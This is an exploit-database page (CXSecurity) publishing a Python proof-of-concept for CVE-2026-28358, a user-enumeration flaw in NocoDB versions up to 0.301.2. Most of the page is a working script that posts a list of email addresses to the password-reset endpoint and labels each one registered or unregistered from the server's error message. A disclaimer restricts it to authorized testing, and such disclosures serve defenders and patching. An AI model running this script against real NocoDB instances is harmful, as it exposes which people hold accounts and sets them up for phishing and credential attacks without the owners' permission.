---
title: NocoDB < = 0.301.2 User Enumeration via Password Reset Endpoint
url: https://cxsecurity.com/issue/WLB-2026030013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-08
fetch_date: 2026-03-09T04:08:03.038002
---

# NocoDB < = 0.301.2 User Enumeration via Password Reset Endpoint

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NocoDB <= 0.301.2 User Enumeration via Password Reset Endpoint** **2026.03.08**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28358](https://cxsecurity.com/cveshow/CVE-2026-28358/ "Click to see CVE-2026-28358")**  CWE: **[CWE-204 Observable Response Discrepancy](https://cxsecurity.com/cwe/CWE-204%20Observable%20Response%20Discrepancy "Click to see CWE-204 Observable Response Discrepancy")** | |

#!/usr/bin/env python3
# Exploit Title: NocoDB User Enumeration via Password Reset Endpoint
# CVE: CVE-2026-28358
# Date: 2026-03-04
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://nocodb.com
# Software Link: https://github.com/nocodb/nocodb
# Affected: NocoDB <= 0.301.2
# Tested on: NocoDB 0.301.0 / 0.301.2
# Category: Webapps
# Platform: Linux / Windows / Docker
# Exploit Type: Remote
# CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
# Description: Unauthenticated user enumeration via timing / response difference
# in the password reset endpoint (/api/v2/auth/password/forgot).
# Registered emails return success message while unregistered ones
# return specific error "Your email has not been registered."
# Fixed in: 0.301.3
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# -- Modify the base\_url and emails list below
#
# Notes:
# • Only for authorized security testing / educational purposes
# • Do not use against systems you do not own or have explicit permission to test
#
# How to Use
#
# Step 1: Update base\_url to point to your target NocoDB instance
# Step 2: Modify or replace the emails list with targets to check
#
# ────────────────────────────────────────────────
import requests
import json
base\_url = "http://<NOCODB\_HOST>/api/v2/auth/password/forgot"
emails = [
"registered@example.com",
"unregistered@example.com",
"admin@company.com",
"user@company.com"
]
headers = {
"Content-Type": "application/json"
}
for email in emails:
payload = {
"email": email
}
try:
response = requests.post(base\_url, headers=headers, data=json.dumps(payload))
print(f"Email: {email}")
print(f"Status Code: {response.status\_code}")
print(f"Response: {response.text}")
if "Your email has not been registered" in response.text:
print("Result: Unregistered\n")
else:
print("Result: Registered (or success message)\n")
except Exception as e:
print(f"Error for {email}: {e}\n")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top